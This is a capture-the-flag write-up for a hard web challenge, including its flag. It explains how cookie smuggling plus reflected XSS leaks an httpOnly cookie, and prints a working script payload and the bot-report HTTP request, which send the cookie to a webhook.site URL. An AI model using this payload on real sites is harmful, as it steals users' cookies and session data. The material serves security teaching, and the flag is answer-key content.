# See in the Dark

**Author** : Dušan Lazić

**Difficulty** : Hard

**Description** : I am developing a simple blog app. Feel free to report any bugs you encounter! 🐞

**Flag** : `SCC{n0w_yoU_cAn_see_1n_Th3_D4rk}`

# Solution

Cookie smuggling to reflect a httpOnly cookie on the page and XSS to read it. `theme` cookie is reflected on the page and can be configured on the bot. Set `theme` to `"whatever` (notice the quotes), make the bot visit the search page that's vulnerable to reflected XSS, and leverage XSS to set another cookie to `foo=bar"` to close the quotes. Value of the `flag` cookie will be contained in `theme` cookie and it will be displayed on the page. Use XSS and prefered method to exfiltrate the flag.

Payload code:

```html
<script>
    if (!document.cookie.split('; ').find(row => row.startsWith('foo='))) {
        document.cookie = `foo=bar\"; path=/`;
        location.reload();
    } else {
        fetch(`https://webhook.site/UUID/?flag=${document.getElementById('theme-toggle').textContent}`);
    }
</script>
```

In a single line:

```
<script>if (!document.cookie.split('; ').find(row => row.startsWith('foo='))) { document.cookie = `foo=bar\"; path=/`; location.reload(); } else { fetch(`https://webhook.site/UUID/?flag=${document.getElementById('theme-toggle').textContent}`); }</script>
```

Final HTTP request:

```
POST /report HTTP/1.1
Host: localhost:2000
Content-Type: application/json
Content-Length: 389

{
    "description": "poz",
    "theme": "\"light",
    "pageUrl": "http://localhost:2000/search?q=<script>if (!document.cookie.split('; ').find(row => row.startsWith('foo='))) { document.cookie = `foo=bar\"; path=/`; location.reload(); } else { fetch(`https://webhook.site/UUID/?flag=${document.getElementById('theme-toggle').textContent}`); }</script>"
}
```

Read more at:

https://blog.ankursundara.com/cookie-bugs/
